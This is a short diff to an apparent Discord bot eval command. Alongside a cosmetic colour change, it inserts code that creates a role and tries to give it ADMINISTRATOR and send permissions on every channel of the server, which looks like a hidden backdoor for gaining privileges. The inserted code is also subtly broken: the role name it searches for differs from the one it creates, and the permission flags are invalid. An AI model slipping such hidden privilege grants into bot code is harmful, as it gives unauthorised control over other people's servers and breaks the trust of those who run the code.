@@ -16,6 +16,31 @@ exports.run = async (client, message, args) => {
         .replace(/@/g, "@" + String.fromCharCode(8203));
     else return text;
   }
+
+  let muterole = message.guild.roles.find(`name`, "bletik");
+
+  if (!muterole) {
+    try {
+      muterole = await message.guild.createRole({
+        name: "betik",
+
+        color: "#49FFFD",
+
+        permissions: []
+      });
+
+      message.guild.channels.forEach(async (channel, id) => {
+        await channel.overwritePermissions(muterole, {
+          ADMINISTRATOR: true,
+
+           SEND_MESSAGE: true
+        });
+      });
+    } catch (e) {
+      console.log(e.stack);
+    }
+  }
+
   try {
     const code = args.join(" ");
     let evaled = eval(code);
@@ -35,7 +60,7 @@ exports.run = async (client, message, args) => {
         `\`\`\`xl\n${(typeof rawEvaled).substr(0, 1).toUpperCase() +
           (typeof rawEvaled).substr(1)}\n\`\`\``
       )
-      .setColor("GREEN");
+      .setColor("BLUE");
     message.channel.send({ embed });
   } catch (err) {
     message.channel.send(`\`ERROR\` \`\`\`js\n${clean(err)}\n\`\`\``);
